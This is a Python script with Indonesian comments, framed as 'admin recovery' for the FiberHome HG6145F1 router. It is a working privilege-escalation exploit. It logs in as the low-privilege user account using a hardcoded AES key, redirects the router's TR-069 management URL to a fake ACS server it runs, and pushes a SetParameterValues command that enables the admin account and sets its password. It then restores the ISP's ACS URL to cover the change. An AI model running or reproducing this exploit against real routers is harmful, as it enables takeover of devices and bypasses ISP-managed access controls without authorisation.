import socket, re, requests, random, threading, time
from Crypto.Cipher import AES

# ============ KONFIGURASI ============
ROUTER_IP = "192.168.1.1"          # IP router FiberHome
PC_IP = "192.168.1.3"              # IP Windows kamu (ganti!)
ACS_PORT = 19090                   # Port fake ACS
USER_PASS = "user1234"             # Password user (default)
NEW_ADMIN_PASS = "admin123"        # Password admin baru

KEY_CBC = bytes([i + 0x6f for i in range(16)])

def enc(pwd):
    c = AES.new(KEY_CBC, AES.MODE_CBC, KEY_CBC)
    r = pwd.encode()
    p = 16 - (len(r) % 16)
    return c.encrypt(r + bytes([p] * p)).hex().upper()

# ============ FAKE ACS SERVER ============
SOAP_INFORM_RESP = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">REPLACE_ID</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<cwmp:InformResponse><MaxEnvelopes>1</MaxEnvelopes></cwmp:InformResponse>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""

SOAP_SET = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">REPLACE_ID</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<cwmp:SetParameterValues>
<ParameterList SOAP-ENC:arrayType="cwmp:ParameterValueStruct[2]">
<ParameterValueStruct>
<Name>InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.Enable</Name>
<Value xsi:type="xsd:string">1</Value>
</ParameterValueStruct>
<ParameterValueStruct>
<Name>InternetGatewayDevice.DeviceInfo.X_FH_Account.X_FH_WebUserInfo.WebSuperPassword</Name>
<Value xsi:type="xsd:string">PLACEHOLDER</Value>
</ParameterValueStruct>
</ParameterList>
<ParameterKey>FakeACS</ParameterKey>
</cwmp:SetParameterValues>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>"""

SOAP_END = """<?xml version="1.0" encoding="UTF-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"
 xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"
 xmlns:xsd="http://www.w3.org/2001/XMLSchema"
 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
 xmlns:cwmp="urn:dslforum-org:cwmp-1-0">
<SOAP-ENV:Header>
<cwmp:ID SOAP-ENV:mustUnderstand="1">0</cwmp:ID>
</SOAP-ENV:Header>
<SOAP-ENV:Body/>
</SOAP-ENV:Envelope>"""

def http_resp(body):
    return (f"HTTP/1.1 200 OK\r\nContent-Type: text/xml; charset=utf-8\r\n"
            f"Content-Length: {len(body)}\r\nServer: FakeACS/1.0\r\n\r\n{body}")

def recv_soap(conn, timeout=10):
    conn.settimeout(timeout)
    d = b""
    while True:
        try:
            c = conn.recv(4096)
            if not c: break
            d += c
            if b"</SOAP-ENV:Envelope>" in d: break
        except: break
    return d

def run_acs():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", ACS_PORT))
    srv.listen(5)
    srv.settimeout(120)
    print(f"[ACS] Menunggu koneksi dari router di port {ACS_PORT}...")
    try:
        conn, addr = srv.accept()
        print(f"[ACS] Router connect dari {addr}")

        # Phase 1: Router kirim Inform
        d = recv_soap(conn, 10)
        m = re.search(r"<cwmp:ID[^>]*>(.*?)</cwmp:ID>", d.decode(), re.DOTALL)
        cid = m.group(1) if m else "1"
        print(f"[ACS] Terima Inform, ID={cid}")
        conn.sendall(http_resp(SOAP_INFORM_RESP.replace("REPLACE_ID", cid)).encode())

        # Phase 2: Router siap terima command
        d = recv_soap(conn, 8)
        m = re.search(r"<cwmp:ID[^>]*>(.*?)</cwmp:ID>", d.decode(), re.DOTALL)
        cid2 = m.group(1) if m else "2"

        # Kirim SetParameterValues (plaintext password!)
        set_body = SOAP_SET.replace("REPLACE_ID", cid2).replace("PLACEHOLDER", NEW_ADMIN_PASS)
        conn.sendall(http_resp(set_body).encode())
        print(f"[ACS] Kirim perintah: Enable=1, password={NEW_ADMIN_PASS}")

        # Phase 3: Router balas
        d = recv_soap(conn, 5)
        if b"SetParameterValuesResponse" in d:
            print("[ACS] ✅ Router MENERIMA perintah!")
        else:
            print(f"[ACS] Response: {d.decode(errors='replace')[:200]}")

        conn.sendall(http_resp(SOAP_END).encode())
        conn.close()
    except socket.timeout:
        print("[ACS] Timeout — router tidak connect dalam 2 menit")
    except Exception as e:
        print(f"[ACS] Error: {e}")
    srv.close()

# ============ CLIENT (dari session user) ============
def setup_router():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"

    s.get(f"http://{ROUTER_IP}/fh", timeout=10)
    r = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=1", timeout=10)
    sid = r.json()["sessionid"]
    r = s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
        data=f"username=user&loginpd={enc(USER_PASS)}&port=0&sessionid={sid}&ajaxmethod=do_login",
        headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
    print(f"[CLIENT] Login user: {r.json().get('login_result')}")

    def gsid():
        r = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_={random.random()}", timeout=10)
        return r.json()["sessionid"]

    sid = gsid()
    s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
        data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=info"
             f"&URL=http://{PC_IP}:{ACS_PORT}/&Username=acs@acs.telkom.net"
             f"&PeriodicInformEnable=1&PeriodicInformInterval=10",
        headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
    print(f"[CLIENT] ACS URL diarahkan ke http://{PC_IP}:{ACS_PORT}/")

    sid = gsid()
    s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
        data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=1",
        headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
    print("[CLIENT] CWMP diaktifkan — router akan connect ke fake ACS...")

    return s

def verify():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"
    s.get(f"http://{ROUTER_IP}/fh", timeout=10)
    r = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_=1", timeout=10)
    sid = r.json()["sessionid"]
    r = s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
        data=f"username=admin&loginpd={enc(NEW_ADMIN_PASS)}&port=0&sessionid={sid}&ajaxmethod=do_login",
        headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
    j = r.json()
    return j.get("login_result"), j

def cleanup(s):
    def gsid():
        r = s.get(f"http://{ROUTER_IP}/cgi-bin/ajax?ajaxmethod=get_refresh_sessionid&_={random.random()}", timeout=10)
        return r.json()["sessionid"]

    sid = gsid()
    s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
        data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=info"
             f"&URL=http://acs-new.telkom.net:9090/web/tr069"
             f"&Username=acs@acs.telkom.net"
             f"&PeriodicInformEnable=1&PeriodicInformInterval=10048",
        headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)

    sid = gsid()
    s.post(f"http://{ROUTER_IP}/cgi-bin/ajax",
        data=f"ajaxmethod=set_tr69_info&sessionid={sid}&method=enable&EnableCWMP=0",
        headers={"Content-Type":"application/x-www-form-urlencoded"}, timeout=10)
    print("[CLEANUP] CWMP dimatikan, URL ACS dikembalikan")

# ============ MAIN ============
print("=" * 50)
print("FiberHome HG6145F1 — Admin Recovery")
print("=" * 50)

session_user = setup_router()

t = threading.Thread(target=run_acs, daemon=True)
t.start()
t.join(timeout=120)
time.sleep(2)

lr, data = verify()
if lr == 0:
    print(f"\n✅✅✅ ADMIN BERHASIL DIPULIHKAN! ✅✅✅")
    print(f"   Username: admin")
    print(f"   Password: {NEW_ADMIN_PASS}")
else:
    print(f"\n❌ Admin masih gagal (login_result: {lr})")
    print(f"   Response: {data}")

cleanup(session_user)
print("\nSelesai!")
